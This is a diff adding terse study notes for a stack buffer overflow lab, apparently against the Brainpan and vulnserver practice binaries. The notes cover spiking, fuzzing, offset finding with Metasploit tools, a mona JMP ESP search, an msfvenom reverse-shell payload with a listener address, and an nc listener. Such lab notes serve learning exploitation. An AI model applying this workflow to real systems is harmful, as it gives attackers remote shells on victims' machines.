@@ -1,0 +1,52 @@
+steps 
+1. spiking
+2.fuzzing
+3. finding the offset
+4. overwriting the EIP
+5. finding bad characters
+6. finding the right modules
+7. Generating Shellcode
+
+        1 .spiking 
+real protection turn off
+run server as admin
+stat.spkls
+s_readline();
+"s_string("TRUN ");"
+s_string_variable("0");
+
+generic_send_tcp IP PORT stats,spk 0 0
+`
+``      2 fuzzing
+brainpan1.py
+./brainpan.py 192.168.43.161 9999
+create pattern
+ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500 
+
+find offset
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 35724134
+[*] Exact match at offset 524
+
+
+bad chars 
+ESP --> follow dump 
+
+
+mona mudules
+
+!mona modules 
+!mona find -s "\xff\xe4" -m essfunc.dll
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+click arrow type jump number
+fire brainJMP.py
+
+control EIP done
+
+now generarte shellcode 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.216 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
+
+
+"A" * 524 + JMP return way +  "\x90" * 8 + shell 
+nc -lvnp 443 
